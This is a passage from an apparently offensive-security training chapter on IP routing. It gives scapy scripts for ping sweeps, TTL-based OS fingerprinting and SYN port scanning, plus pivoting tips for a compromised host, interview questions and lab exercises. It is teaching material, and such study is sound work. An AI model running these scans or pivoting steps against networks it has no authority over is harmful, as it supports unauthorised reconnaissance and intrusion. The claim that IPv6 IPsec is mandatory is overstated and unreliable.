# Now all traffic to 10.x.x.x goes through attacker!
```

---

## 12. IP-Based Reconnaissance

### 12.1 IP Reconnaissance Techniques

```python
#!/usr/bin/env python3
"""
IP-Based Reconnaissance Toolkit
"""

from scapy.all import *

def ip_sweep(network):
    """
    Discover live hosts
    """
    print(f"[*] IP sweep: {network}")
    
    ans, unans = sr(IP(dst=network)/ICMP(), timeout=2, verbose=0)
    
    print(f"[+] Live hosts ({len(ans)}):")
    for sent, recv in ans:
        print(f"    {recv.src}")

def os_fingerprint_ttl(target):
    """
    OS fingerprinting via TTL
    """
    resp = sr1(IP(dst=target)/ICMP(), timeout=2, verbose=0)
    
    if resp:
        ttl = resp[IP].ttl
        
        if ttl <= 64:
            os = "Linux/Unix"
        elif ttl <= 128:
            os = "Windows"
        else:
            os = "Network Device"
        
        print(f"[+] {target}: TTL={ttl} → {os}")

# Example
if __name__ == "__main__":
    network = input("Network to scan: ")
    ip_sweep(network)
```

---

## 13. IPv4 vs IPv6 Security Comparison

```
┌──────────────────┬─────────────────┬─────────────────┐
│ Feature          │ IPv4            │ IPv6            │
├──────────────────┼─────────────────┼─────────────────┤
│ Address Size     │ 32-bit          │ 128-bit         │
│ Address Space    │ 4.3 billion     │ 340 undecillion │
│ NAT Required     │ Yes (common)    │ No              │
│ ARP              │ Yes             │ No (uses NDP)   │
│ Broadcasts       │ Yes             │ No (multicast)  │
│ IPsec            │ Optional        │ Mandatory       │
│ Auto-config      │ DHCP            │ SLAAC           │
│ Security Issues  │ ARP spoofing    │ NDP spoofing    │
│                  │ IP fragmentation│ Extension headers│
│                  │ Reflection DDoS │ Rogue RA        │
└──────────────────┴─────────────────┴─────────────────┘
```

---

## 14. Practical Code Examples

### 14.1 Complete Network Mapper

```python
#!/usr/bin/env python3
"""
Complete Network Reconnaissance Tool
"""

from scapy.all import *
import ipaddress

class NetworkMapper:
    def __init__(self, network):
        self.network = ipaddress.IPv4Network(network)
        self.live_hosts = []
    
    def ping_sweep(self):
        """Discover live hosts"""
        print(f"[*] Ping sweep: {self.network}")
        
        ans, unans = sr(IP(dst=str(self.network))/ICMP(), timeout=2, verbose=0)
        
        for sent, recv in ans:
            self.live_hosts.append(recv.src)
            print(f"[+] Live: {recv.src}")
        
        return self.live_hosts
    
    def port_scan(self, host, ports=[80,443,22,21,23,25,3389]):
        """Quick port scan"""
        print(f"\n[*] Scanning {host}")
        
        for port in ports:
            resp = sr1(IP(dst=host)/TCP(dport=port, flags="S"), timeout=1, verbose=0)
            
            if resp and resp.haslayer(TCP):
                if resp[TCP].flags == "SA":
                    print(f"    [+] Port {port}: OPEN")
    
    def full_scan(self):
        """Complete network scan"""
        self.ping_sweep()
        
        for host in self.live_hosts[:5]:  # Limit to first 5
            self.port_scan(host)

# Usage
if __name__ == "__main__":
    network = input("[?] Network (e.g., 192.168.1.0/24): ")
    mapper = NetworkMapper(network)
    mapper.full_scan()
```

---

## 15. Critical Analysis & Checkpoints

### 15.1 The "Default Route" Trap

Attackers often assume the default gateway (`.1` or `.254`) is the only way out. In complex enterprise networks, static routes might exist for internal subnets.

**Check**: Always run `route print` or `ip route` on a compromised host to discover hidden internal networks (e.g., a backup network on `10.50.0.0/16`).

### 15.2 Interview Questions

1. **Q**: What is the difference between specific routes and the default route?
   - **A**: Routing is "Longest Match Wins". A route to `10.1.1.0/24` takes precedence over `10.0.0.0/8`, which takes precedence over `0.0.0.0/0`.

2. **Q**: Why is fragmentation bad for firewalls?
   - **A**: It forces the firewall to reassemble packets (resource intensive) or make decisions on incomplete data (security risk).

3. **Q**: How many usable hosts in a `/29`?
   - **A**: 6. (8 total - Network ID - Broadcast = 6).

4. **Q**: Can you perform ARP spoofing across the internet?
   - **A**: No. ARP is Layer 2 and doesn't cross routers. It only works within local broadcast domains.

5. **Q**: What's the main security advantage of IPv6 over IPv4?
   - **A**: Mandatory IPsec support, larger address space (no NAT needed), and better built-in security features.

### 15.3 Practical Exercises

**Exercise 1**: Given IP `10.50.75.200/22`, calculate:
- Network address
- Broadcast address
- Usable IP range
- Number of hosts

**Exercise 2**: Set up a GRE tunnel between two Linux VMs and route traffic through it.

**Exercise 3**: Write a script to detect if you're behind NAT and identify the NAT type.

**Exercise 4**: Perform a fragmentation attack against a test system and analyze with Wireshark.

---

## Summary

This chapter covered Layer 3 (Network Layer) in comprehensive detail:

**Key Concepts**:
- IPv4 header structure and manipulation
- Routing logic and routing tables
- Subnetting calculations and network segmentation
- Fragmentation mechanics and attacks
- ICMP protocol and attacks
- IPv6 fundamentals and security
- NAT and routing attacks

**Attack Techniques**:
- IP spoofing and reflection attacks
- Fragmentation-based evasion
- ICMP redirect and Smurf attacks
- IPv6 NDP spoofing and rogue RAs
- Route manipulation for pivoting
- GRE tunneling for bypassing controls

**Defense Strategies**:
- Proper subnet segmentation
- Filtering ICMP appropriately
- Detecting IP spoofing
- Securing IPv6 deployments
- Monitoring routing changes

**Practical Skills**:
- Calculating subnets instantly
- Reading and manipulating routing tables
- Crafting custom IP packets
- Setting up tunnels for pivoting
- Network reconnaissance techniques

### Next Steps

1. Practice subnetting calculations
2. Set up lab with multiple subnets
3. Experiment with routing manipulation
4. Analyze fragmented packets in Wireshark
5. Study IPv6 security in depth
6. Build custom network mapping tools

---

*End of Chapter: IP Routing & Fragmentation*

